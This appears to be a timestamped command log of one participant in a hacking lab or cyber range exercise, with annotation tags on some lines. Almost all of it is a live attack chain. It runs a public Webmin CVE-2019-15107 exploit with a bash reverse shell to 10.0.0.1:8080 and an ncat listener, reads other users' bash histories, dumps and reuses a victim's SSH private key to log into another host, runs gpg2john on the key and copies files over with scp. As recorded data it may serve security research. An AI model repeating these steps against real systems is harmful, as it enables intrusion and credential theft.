User 66 start time 1594798160 end 1594805940
PADDING
PADDING
PADDING
INPUT|66--0|U|1594798160|66|ifconfig|OUTPUT
INPUT|66--1|U|1594798233|66|nmao|OUTPUT
INPUT|66--2|U|1594798236|66|nmap|OUTPUT
INPUT|66--3|U|1594798353|66|nmap|OUTPUT
INPUT|66--4|U|1594798425|66|ifconfig|OUTPUT
INPUT|66--5|A0 |1594798937|66|nmap -h|OUTPUT
INPUT|66--6|U|1594799446|66|curl|OUTPUT
INPUT|66--7|U|1594802490|66|ifconfig|OUTPUT
INPUT|66--8|U|1594802754|66|git clone github.com/jas502n/CVE-2019-15107|OUTPUT
INPUT|66--9|U|1594802775|66|git clone https://github.com/jas502n/CVE-2019-15107|OUTPUT
INPUT|66--10|U|1594803162|66|python CVE_2019_15107.py https://172.18.1.5:10000 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'|OUTPUT
INPUT|66--11|U|1594803194|66|ls|OUTPUT
INPUT|66--12|U|1594803211|66|ls -la|OUTPUT
INPUT|66--13|U|1594803217|66|drwx------  3 root root  4096 Apr  7 11:39 .gnupg|OUTPUT
INPUT|66--14|U|1594803217|66|drwxr-xr-x  3 root root  4096 Jul 15 09:27 .local|OUTPUT
INPUT|66--15|U|1594803217|66|drwxr-xr-x  2 root root  4096 Jul 15 09:27 Music|OUTPUT
INPUT|66--16|U|1594803217|66|drwxr-xr-x  2 root root  4096 Jul 15 09:27 Pictures|OUTPUT
INPUT|66--17|U|1594803237|66|git clone https://github.com/jas502n/CVE-2019-15107|OUTPUT
INPUT|66--18|U|1594803259|66|cd|OUTPUT
INPUT|66--19|U|1594803260|66|ls|OUTPUT
INPUT|66--20|U|1594803267|66|cd CVE-2019-15107/|OUTPUT
INPUT|66--21|U|1594803268|66|ls|OUTPUT
INPUT|66--22|U|1594803278|66|python CVE_2019_15107.py https://172.18.1.5:10000 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'|OUTPUT
INPUT|66--23|U|1594803298|66|python CVE_2019_15107.py http://172.18.1.5:10000 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'|OUTPUT
INPUT|66--24|U|1594803338|66|ncat -l 8080|OUTPUT
INPUT|66--25|U|1594803350|66|sudo apt install ncat|OUTPUT
INPUT|66--26|U|1594803399|66|ncat -l 8080|OUTPUT
INPUT|66--27|U|1594803415|66|ncat -i 8080|OUTPUT
INPUT|66--28|U|1594803438|66|ncat -l 8080|OUTPUT
INPUT|66--29|U|1594803445|66|python CVE_2019_15107.py http://172.18.1.5:10000 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'|OUTPUT
INPUT|66--30|U|1594803633|66|python CVE_2019_15107.py http://172.18.1.5:10000 'id'|OUTPUT
INPUT|66--31|U|1594803767|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cat ./.bash_history'|OUTPUT
INPUT|66--32|U|1594803789|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cat home/eva/.bash_history'|OUTPUT
INPUT|66--33|U|1594803796|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cat home/bob/.bash_history'|OUTPUT
INPUT|66--34|U|1594803803|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cat home/debian/.bash_history'|OUTPUT
INPUT|66--35|U|1594803835|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls home/debian/'|OUTPUT
INPUT|66--36|U|1594803840|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/debian/'|OUTPUT
INPUT|66--37|U|1594803849|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la'|OUTPUT
INPUT|66--38|U|1594803878|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /home ; ls'|OUTPUT
INPUT|66--39|U|1594803893|66|module.info.pt_BR.UTF-8|OUTPUT
INPUT|66--40|U|1594803893|66|module.info.ru.UTF-8|OUTPUT
INPUT|66--41|U|1594803893|66|module.info.ru_RU|OUTPUT
INPUT|66--42|U|1594803893|66|module.info.ru_RU.UTF-8|OUTPUT
INPUT|66--43|U|1594803893|66|module.info.ru_SU|OUTPUT
INPUT|66--44|U|1594803893|66|module.info.sk|OUTPUT
INPUT|66--45|U|1594803893|66|module.info.sk.UTF-8|OUTPUT
INPUT|66--46|U|1594803893|66|module.info.sv|OUTPUT
INPUT|66--47|U|1594803894|66|module.info.sv.UTF-8|OUTPUT
INPUT|66--48|U|1594803894|66|module.info.tr|OUTPUT
INPUT|66--49|U|1594803894|66|module.info.zh_CN|OUTPUT
INPUT|66--50|U|1594803894|66|module.info.zh_TW.Big5|OUTPUT
INPUT|66--51|U|1594803894|66|negativeacl|OUTPUT
INPUT|66--52|U|1594803894|66|openssl.cnf|OUTPUT
INPUT|66--53|U|1594803894|66|postinstall.pl|OUTPUT
INPUT|66--54|U|1594803894|66|save_acl.cgi|OUTPUT
INPUT|66--55|U|1594803894|66|save_group.cgi|OUTPUT
INPUT|66--56|U|1594803894|66|save_pass.cgi|OUTPUT
INPUT|66--57|U|1594803894|66|save_sql.cgi|OUTPUT
INPUT|66--58|U|1594803894|66|save_sync.cgi|OUTPUT
INPUT|66--59|U|1594803894|66|save_twofactor.cgi|OUTPUT
INPUT|66--60|U|1594803894|66|save_unix.cgi|OUTPUT
INPUT|66--61|U|1594803894|66|save_user.cgi|OUTPUT
INPUT|66--62|U|1594803894|66|schema.cgi|OUTPUT
INPUT|66--63|U|1594803894|66|switch.cgi|OUTPUT
INPUT|66--64|U|1594803894|66|system_info.pl|OUTPUT
INPUT|66--65|U|1594803894|66|twofactor.pl|OUTPUT
INPUT|66--66|U|1594803894|66|twofactor_form.cgi|OUTPUT
INPUT|66--67|U|1594803894|66|useradmin_update.pl|OUTPUT
INPUT|66--68|U|1594803894|66|webmin.schema|OUTPUT
INPUT|66--69|U|1594803914|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /home ; ls -la'|OUTPUT
INPUT|66--70|U|1594803926|66|rwxr-xr-x   6 root bin 12288 Jul  4  2019 .|OUTPUT
INPUT|66--71|U|1594803926|66|drwxr-xr-x 132 root bin 12288 Jul  4  2019 ..|OUTPUT
INPUT|66--72|U|1594803926|66|drwxr-xr-x   3 root bin  4096 Jul  4  2019 Authen-SolarisRBAC-0.1|OUTPUT
INPUT|66--73|U|1594803951|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cd / ; ls -la'|OUTPUT
INPUT|66--74|U|1594804027|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home'|OUTPUT
INPUT|66--75|U|1594804038|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/alice'|OUTPUT
INPUT|66--76|U|1594804047|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/alice'|OUTPUT
INPUT|66--77|U|1594804060|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/debian'|OUTPUT
INPUT|66--78|U|1594804078|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/eve'|OUTPUT
INPUT|66--79|U|1594804111|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.bash_history'|OUTPUT
INPUT|66--80|U|1594804207|66|ervices|OUTPUT
INPUT|66--81|U|1594804207|66|echo '81.2.195.254' >> ~/top-secret/too_dangerous.txt|OUTPUT
INPUT|66--82|U|1594804342|66|2.195.254|OUTPUT
INPUT|66--83|A1 M1 |1594804342|66|cat /etc/services|OUTPUT
INPUT|66--84|U|1594804342|66|less /etc/services|OUTPUT
INPUT|66--85|U|1594804454|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/bob/.bash_history'|OUTPUT
INPUT|66--86|U|1594804464|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/bob'|OUTPUT
INPUT|66--87|U|1594804490|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.bash_history'|OUTPUT
INPUT|66--88|U|1594804672|66|ssh 10.1.18.22|OUTPUT
INPUT|66--89|U|1594804682|66|ssh 10.1.17.4|OUTPUT
INPUT|66--90|U|1594804760|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ssh eve@10.1.17.4'|OUTPUT
INPUT|66--91|U|1594804795|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh'|OUTPUT
INPUT|66--92|U|1594804806|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/eve/'|OUTPUT
INPUT|66--93|U|1594804835|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh'|OUTPUT
INPUT|66--94|U|1594804840|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.bash_history'|OUTPUT
INPUT|66--95|U|1594804847|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/eve/'|OUTPUT
INPUT|66--96|U|1594804901|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/bob'|OUTPUT
INPUT|66--97|U|1594804906|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/eve'|OUTPUT
INPUT|66--98|U|1594804955|66|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/eve/.ssh/'|OUTPUT
INPUT|66--99|U|1594804980|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh/id_rsa'|OUTPUT
INPUT|66--100|U|1594805021|66|touch id_rsa|OUTPUT
INPUT|66--101|U|1594805035|66|nano id_rsa|OUTPUT
INPUT|66--102|U|1594805056|66|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh/id_rsa.pub'|OUTPUT
INPUT|66--103|U|1594805073|66|touch id_rsa.pub|OUTPUT
INPUT|66--104|U|1594805079|66|nano id_rsa.pub|OUTPUT
INPUT|66--105|U|1594805206|66|ssh eve@10.1.17.4|OUTPUT
INPUT|66--106|U|1594805250|66|cd ..|OUTPUT
INPUT|66--107|U|1594805252|66|ls|OUTPUT
INPUT|66--108|U|1594805259|66|cd .ssh|OUTPUT
INPUT|66--109|U|1594805260|66|ls|OUTPUT
INPUT|66--110|U|1594805265|66|ls -la|OUTPUT
INPUT|66--111|U|1594805337|66|chmod 600 id_rsa|OUTPUT
INPUT|66--112|U|1594805340|66|ls -la|OUTPUT
INPUT|66--113|U|1594805350|66|ssh eve@10.1.17.4|OUTPUT
INPUT|66--114|U|1594805759|66|gpg2john id_rsa|OUTPUT
INPUT|66--115|U|1594805940|66|scp -r * eve@10.1.17.4:/home/eve/|OUTPUT
